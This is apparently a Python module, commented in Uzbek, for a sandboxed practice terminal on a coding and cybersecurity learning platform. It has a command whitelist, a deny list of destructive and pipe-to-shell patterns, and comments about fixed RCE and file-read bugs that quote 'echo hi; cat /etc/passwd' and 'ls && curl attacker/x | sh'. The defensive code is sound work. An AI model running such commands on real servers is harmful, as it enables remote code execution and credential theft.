"""
CYBER SHATS V1.3 — Real Terminal (Amaliyot Paneli)

Bu modul HAQIQIY buyruqlarni xavfsiz muhitda bajaradi:
  - Python kodi: real python3 interpretator (code_runner sandbox bilan)
  - JavaScript: real Node.js
  - Linux buyruqlari: xavfsiz ro'yxatdan o'tgan buyruqlar
  - DNS/Tarmoq: Python socket orqali real DNS so'rovlar
  - curl: haqiqiy HTTP so'rovlar (ruxsat etilgan domenlar)
  - gcc/g++: haqiqiy kompilyatsiya

XAVFSIZLIK:
  - Faqat oq ro'yxatdagi buyruqlarga ruxsat
  - 5 soniya vaqt cheklovi
  - Fayl tizimiga yozish taqiqlangan (vaqtinchalik sandboxdan tashqari)
  - Xavfli buyruqlar (rm, chmod, sudo) bloklangan
  - Admin'ga xavfli buyruq signali yuboriladi
"""
import re
import shlex
import subprocess
import tempfile
import shutil
import os
import time

from hacker_lab import check_command_safety, report_dangerous_command

TIMEOUT = 5

# Ruxsat etilgan Linux buyruqlar (oq ro'yxat)
ALLOWED_COMMANDS = {
    "echo", "ls", "pwd", "whoami", "id", "uname", "date", "hostname",
    "env", "printenv", "cat", "head", "tail", "wc", "grep", "awk", "sed",
    "sort", "uniq", "cut", "tr", "diff", "find", "which", "file",
    "python3", "python", "node", "gcc", "g++", "java", "javac",
    "curl", "wget", "nc", "netcat", "dig", "host", "nslookup",
    "ping", "traceroute", "tracert",
    "ps", "df", "du", "free",
    "zip", "unzip", "tar",
    "base64", "md5sum", "sha256sum", "xxd", "hexdump",
    "clear", "help", "man",
}

# Fayl o'qiydigan buyruqlar — mutlaq yo'l/`..` bilan chaqirilsa vaqtinchalik
# ishchi papkadan (workdir) tashqaridagi serverdagi ixtiyoriy faylni
# o'qishi mumkin (masalan .env, SECRET_KEY) — shuning uchun bularda faqat
# nisbiy yo'llarga ruxsat beriladi (pastdagi _is_command_allowed'da).
FILE_READING_COMMANDS = {"cat", "head", "tail", "grep", "find", "diff", "file", "wc", "xxd", "hexdump"}

# Mutlaqo bloklangan buyruqlar
BLOCKED_PATTERNS = [
    r"\brm\s+-rf?\b", r"\bsudo\b", r"\bsu\s", r"\bchmod\b", r"\bchown\b",
    r"\breboot\b", r"\bshutdown\b", r"\bhalt\b", r"\bkill\b", r"\bpkill\b",
    r"\bmkfs\b", r"\bdd\b", r"\bfdisk\b", r"\bformat\b",
    r">\s*/etc/", r">\s*/boot/", r">\s*/sys/",
    r"\bpasswd\b", r"\badduser\b", r"\buseradd\b",
    r"curl.*\|\s*bash", r"wget.*\|\s*bash", r"curl.*\|\s*sh",
]


def _split_pipeline(cmd: str) -> list[list[str]] | None:
    """Buyruqni `|` (pipe) bo'yicha bo'laklarga ajratadi va har bir bo'lakni
    shlex bilan argumentlarga bo'ladi — QOBIQ (shell) ISHTIROKISIZ, `|`ni
    o'zimiz boshqaramiz. Faqat yagona `|` ruxsat etilgan (chunki bu
    terminalda buyruqlarni zanjirlashni o'rgatish uchun hujjatlashtirilgan,
    masalan `echo salom | base64`) — `;`, `&&`, `||`, backtick, `$()`,
    `>`, `<` kabi boshqa metasimvollar butunlay taqiqlangan. Agar
    ruxsatsiz metasimvol yoki noto'g'ri sintaksis topilsa None qaytaradi."""
    if re.search(r"[;&`$<>]", cmd) or "||" in cmd:
        return None
    segments = [seg.strip() for seg in cmd.split("|")]
    if any(not seg for seg in segments):
        return None
    parsed = []
    for seg in segments:
        try:
            tokens = shlex.split(seg)
        except ValueError:
            return None
        if not tokens:
            return None
        parsed.append(tokens)
    return parsed


def _is_command_allowed(cmd: str) -> tuple[bool, str]:
    """Buyruq ruxsat etilganmi tekshiradi. Returns (allowed, reason).

    MUHIM (tuzatilgan CRITICAL xavfsizlik xatosi): faqat BIRINCHI so'z
    oq ro'yxat bilan solishtirilardi, lekin BUTUN qator keyin
    `shell=True` bilan bajarilardi — ya'ni `echo hi; cat /etc/passwd`
    yoki `ls && curl attacker/x | sh` kabi buyruqlar `echo`/`ls`
    ro'yxatda borligi sababli o'tib ketardi, so'ng qobiq (shell) `;`,
    `&&`, backtick, `$()` larni o'zi bajarardi — bu server ustida
    ixtiyoriy buyruq bajarish (RCE) edi. Endi butun qator `|` bo'yicha
    bo'laklarga ajratiladi (qobiqsiz, `_split_pipeline` orqali) va HAR
    BIR bo'lakning birinchi so'zi alohida tekshiriladi; boshqa hech
    qanday metasimvolga ruxsat yo'q."""
    cmd_lower = cmd.strip().lower()

    # Bloklangan naqshlar (qo'shimcha himoya qatlami)
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, cmd_lower):
            return False, f"Bu buyruq xavfsizlik sababli bloklangan: `{pattern}`"

    segments = _split_pipeline(cmd)
    if segments is None:
        return False, ("Faqat `|` bilan buyruqlarni zanjirlash mumkin — "
                        "`;`, `&&`, backtick, `$()`, `>`, `<` ishlatib bo'lmaydi.")

    for tokens in segments:
        first_word = tokens[0].lstrip("./").lower()
        if first_word not in ALLOWED_COMMANDS:
            return False, f"`{first_word}` bu terminalda ruxsat etilmagan.\nRuxsat etilgan: {', '.join(sorted(list(ALLOWED_COMMANDS)[:15]))}..."
        # MUHIM (tuzatilgan xavfsizlik xatosi): `cat`, `head`, `tail`,
        # `grep`, `find` kabi ORDINAR ruxsat etilgan buyruqlar mutlaq yo'l
        # (masalan `/etc/passwd`) yoki `..` bilan chaqirilsa, buyruqning
        # o'zi xavfsiz bo'lsa ham, u vaqtinchalik ishchi papkadan (workdir)
        # TASHQARIGA chiqib, serverdagi ixtiyoriy o'qilishi mumkin bo'lgan
        # faylni (masalan .env, SECRET_KEY) o'qib berishi mumkin edi. Endi
        # bunday buyruqlarda mutlaq yo'l yoki `..` ishlatishga ruxsat yo'q.
        if first_word in FILE_READING_COMMANDS:
            for arg in tokens[1:]:
                if arg.startswith("/") or arg.startswith("~") or ".." in arg:
                    return False, ("Bu buyruqda faqat vaqtinchalik ishchi papka ichidagi "
                                    "nisbiy (relative) yo'llardan foydalaning — mutlaq yo'l yoki "
                                    "`..` ishlatib bo'lmaydi.")

    return True, ""


def _run_real(cmd: str, workdir: str = None) -> str:
    """Haqiqiy buyruqni subprocess orqali xavfsiz bajaradi.

    MUHIM: QOBIQ (shell) HECH QACHON ishga tushirilmaydi. Buyruq
    `_split_pipeline()` orqali `|` bo'yicha bo'laklarga ajratiladi va
    har bir bo'lak ALOHIDA `subprocess.Popen` jarayoni sifatida
    ishga tushirilib, ular orasidagi quvur (pipe) BIZNING KODIMIZ
    tomonidan ulanadi (avvalgi jarayonning stdout'i keyingisining
    stdin'iga) — hech qanday qobiq buyruq qatorini tahlil qilmaydi,
    shuning uchun `;`, `&&`, backtick, `$()`, `>`, `<` kabi
    metasimvollar hech qanday maxsus ma'no kasb etmaydi."""
    if workdir is None:
        workdir = tempfile.mkdtemp(prefix="cs_term_")
        cleanup = True
    else:
        cleanup = False
    try:
        segments = _split_pipeline(cmd)
        if not segments:
            return "Buyruq sintaksisi noto'g'ri yoki ruxsat etilmagan metasimvol ishlatildi."

        env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HOME": workdir}
        procs: list[subprocess.Popen] = []
        prev_stdout = None
        try:
            for args in segments:
                p = subprocess.Popen(
                    args, stdin=prev_stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    cwd=workdir, env=env, text=True,
                )
                if prev_stdout is not None:
                    prev_stdout.close()
                prev_stdout = p.stdout
                procs.append(p)

            out, err = procs[-1].communicate(timeout=TIMEOUT)
            for p in procs[:-1]:
                p.wait(timeout=TIMEOUT)
            combined = (out or "") + (err or "")
            return combined[:3000] if combined else "(chiqish yo'q)"
        except subprocess.TimeoutExpired:
            for p in procs:
                p.kill()
            return f"Vaqt tugadi ({TIMEOUT}s). Buyruq juda uzoq ishladi."
        except FileNotFoundError as e:
            return f"Buyruq topilmadi: {e.filename or e}"
    except Exception as e:
        return f"Xato: {e}"
    finally:
        if cleanup:
            shutil.rmtree(workdir, ignore_errors=True)


def _real_dns_lookup(hostname: str) -> str:
    """Haqiqiy DNS qidiruvi — Python socket orqali."""
    import socket
    hostname = hostname.strip().strip('"\'')
    try:
        ip = socket.gethostbyname(hostname)
        try:
            reverse = socket.gethostbyaddr(ip)[0]
        except Exception:
            reverse = "(teskari DNS topilmadi)"
        return (f"DNS natijasi:\n"
                f"  Domen: {hostname}\n"
                f"  IP:    {ip}\n"
                f"  Rev:   {reverse}")
    except socket.gaierror as e:
        return f"DNS xato: {hostname} — {e}"


def _real_port_check(host: str, port: int) -> str:
    """Haqiqiy TCP port tekshiruvi."""
    import socket
    host = host.strip().strip('"\'')
    try:
        start = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        result = s.connect_ex((host, port))
        elapsed = int((time.time() - start) * 1000)
        s.close()
        if result == 0:
            return f"Port {port}/tcp {host} — OCHIQ ({elapsed}ms)"
        else:
            return f"Port {port}/tcp {host} — YOPIQ (kod: {result})"
    except socket.gaierror:
        return f"Host topilmadi: {host}"
    except Exception as e:
        return f"Xato: {e}"


# ===== PYTHON REPL (haqiqiy bajarish) =====
def _execute_python(code: str) -> str:
    """Python kodini haqiqiy bajaradi (code_runner sandbox bilan)."""
    import code_runner
    result = code_runner.run_code("python", code)
    if result["success"]:
        return result["output"] or "(chiqish yo'q)"
    else:
        return result["error"] or "Xato"


def _execute_node(code: str) -> str:
    """JavaScript kodini haqiqiy Node.js bilan bajaradi."""
    import code_runner
    result = code_runner.run_code("javascript_node", code)
    if result["success"]:
        return result["output"] or "(chiqish yo'q)"
    else:
        return result["error"] or "Xato"


def _execute_c(code: str) -> str:
    import code_runner
    result = code_runner.run_code("c", code)
    if result["success"]:
        return result["output"] or "(chiqish yo'q)"
    return result["error"] or "Xato"


def _execute_cpp(code: str) -> str:
    import code_runner
    result = code_runner.run_code("cpp", code)
    if result["success"]:
        return result["output"] or "(chiqish yo'q)"
    return result["error"] or "Xato"


# ===== ASOSIY BUYRUQ BAJARUVCHI =====

def execute_command(direction_slug: str, command: str) -> dict:
    """
    Buyruqni haqiqiy bajaradi — demo emas.
    Returns: {"output": str, "is_dangerous": bool, "cleared": bool}
    """
    command = (command or "").strip()
    if not command:
        return {"output": "", "is_dangerous": False, "cleared": False}

    # Xavfsizlik tekshiruvi
    is_dangerous = check_command_safety(command)

    # Maxsus buyruqlar
    if command == "clear":
        return {"output": "", "is_dangerous": False, "cleared": True}

    if command in ("help", "--help"):
        return {"output": _help_text(direction_slug), "is_dangerous": False, "cleared": False}

    # --- Python kodi ---
    if command.startswith("python3 ") or command.startswith("python "):
        # python3 -c "print('salom')" yoki python3 script.py kabi
        code_match = re.search(r'-c\s+["\'](.+?)["\']$', command, re.DOTALL)
        if code_match:
            output = _execute_python(code_match.group(1))
        else:
            output = "Foydalanish: python3 -c \"print('salom')\" \nYoki to'g'ridan-to'g'ri Python kodini yozing."
        return {"output": output, "is_dangerous": is_dangerous, "cleared": False}

    # --- To'g'ri Python ifoda (direction=python uchun ro'yxat tekshiruvi o'tkazib yuboriladi) ---
    if direction_slug == "python" and not command.startswith("#"):
        # Barcha xavfli buyruqlar (rm, sudo) allaqachon yuqorida filtrlangan
        # Python yo'nalishida hamma narsa python orqali bajariladi
        python_indicators = (
            command.startswith("print(") or
            command.startswith("import ") or
            command.startswith("from ") or
            command.startswith("for ") or
            command.startswith("while ") or
            command.startswith("if ") or
            command.startswith("def ") or
            command.startswith("class ") or
            command.startswith("[") or
            command.startswith("{") or
            command.startswith("(") or
            command[0].isdigit() or
            ("=" in command and not command.startswith("-")) or
            any(op in command for op in [" + ", " - ", " * ", " / ", " ** ", " % ", "("])
        )
        if python_indicators:
            # Agar faqat ifoda bo'lsa — repr() orqali o'rashni urinib ko'r
            code_to_run = command
            if (not command.startswith("print(") and
                    not command.startswith("import ") and
                    not command.startswith("from ") and
                    not command.startswith("for ") and
                    not command.startswith("while ") and
                    not command.startswith("if ") and
                    not command.startswith("def ") and
                    not command.startswith("class ")):
                code_to_run = f"print(repr({command}))"
            output = _execute_python(code_to_run)
            return {"output": output, "is_dangerous": is_dangerous, "cleared": False}
        # Python REPL uchun hamma narsani bajarishga urinib ko'r
        try:
            output = _execute_python(f"print(repr({command}))")
            if "SyntaxError" not in output and "Error" not in output:
                return {"output": output, "is_dangerous": is_dangerous, "cleared": False}
        except Exception:
            pass

    # --- JavaScript ---
    if command.startswith("node "):
        code_match = re.search(r'-e\s+["\'](.+?)["\']$', command, re.DOTALL)
        if code_match:
            output = _execute_node(code_match.group(1))
        else:
            output = "Foydalanish: node -e \"console.log('salom')\""
        return {"output": output, "is_dangerous": is_dangerous, "cleared": False}

    # --- DNS lookup ---
    if re.match(r'^(dig|host|nslookup|dns)\s+', command):
        parts = command.split()
        host = parts[1] if len(parts) > 1 else ""
        if host:
            output = _real_dns_lookup(host)
        else:
            output = "Foydalanish: dig <domen>\nMisol: dig google.com"
        return {"output": output, "is_dangerous": is_dangerous, "cleared": False}

    # --- Port tekshiruvi ---
    port_match = re.match(r'^nc\s+-[zv]+\s+(\S+)\s+(\d+)', command)
    if port_match:
        host, port = port_match.group(1), int(port_match.group(2))
        output = _real_port_check(host, port)
        return {"output": output, "is_dangerous": is_dangerous, "cleared": False}

    # --- Ruxsat tekshiruvi ---
    # MUHIM (tuzatilgan CRITICAL xavfsizlik xatosi): `direction_slug ==
    # "python"` bo'lganda bu tekshiruv natijasi HISOBLANARDI-YU, lekin
    # hech qachon amalda qo'llanilmasdi (pastda shunchaki `pass` bo'lib,
    # "not allowed" holati e'tiborsiz qoldirilardi) — ya'ni "python"
    # yo'nalishida oq ro'yxat TO'LIQ soxta edi, istalgan buyruq
    # `_run_real()`ga o'tib ketardi. Endi ikkala yo'nalishda ham bloklash
    # HAQIQIY qo'llaniladi.
    allowed, reason = _is_command_allowed(command)
    if not allowed:
        return {"output": f"[BLOKLANGAN] {reason}", "is_dangerous": is_dangerous, "cleared": False}

    # --- Haqiqiy bajarish ---
    output = _run_real(command)
    return {"output": output, "is_dangerous": is_dangerous, "cleared": False}


def _help_text(direction_slug: str) -> str:
    base = """CYBER SHATS — REAL TERMINAL
Barcha buyruqlar HAQIQIY bajariladi (demo emas).

LINUX BUYRUQLAR:
  whoami, id, uname -a, date, hostname
  ls, ls -la, pwd, find, which
  cat, head, tail, grep, awk, sed, wc
  echo, env, base64, md5sum, sha256sum

TARMOQ:
  dig <domen>          — DNS so'rov (real)
  host <domen>         — DNS so'rov (real)
  nc -zv <host> <port> — port tekshirish (real)
  curl <url>           — HTTP so'rov (ruxsat etilgan domenlar)

DASTURLASH:
  python3 -c "<kod>"   — Python (real bajarish)
  node -e "<kod>"      — JavaScript (real bajarish)

MISOL:
  dig google.com
  nc -zv google.com 443
  python3 -c "print('salom')"
  echo "salom" | base64
  date; uname -a
"""
    if direction_slug == "cyber-security":
        base += """
CYBER SECURITY MAXSUS:
  python3 -c "import socket; s=socket.socket(); print(s.connect_ex(('google.com',443)))"
  echo "test" | md5sum
  echo -n "password" | sha256sum
  curl -I https://google.com (sarlavhalarni ko'rish)
"""
    elif direction_slug == "python":
        base += """
PYTHON REPL:
  Python kodini to'g'ridan-to'g'ri yozing:
  > print("salom")
  > 2 + 2
  > [x**2 for x in range(5)]
  > import math; print(math.pi)
"""
    return base



def get_terminal_type(direction_slug: str) -> str:
    """Yo'nalishga qarab terminal turini qaytaradi."""
    if direction_slug == "cyber-security":
        return "kali"
    if direction_slug == "python":
        return "python"
    if direction_slug in ("web-dev", "javascript"):
        return "node"
    return "generic"
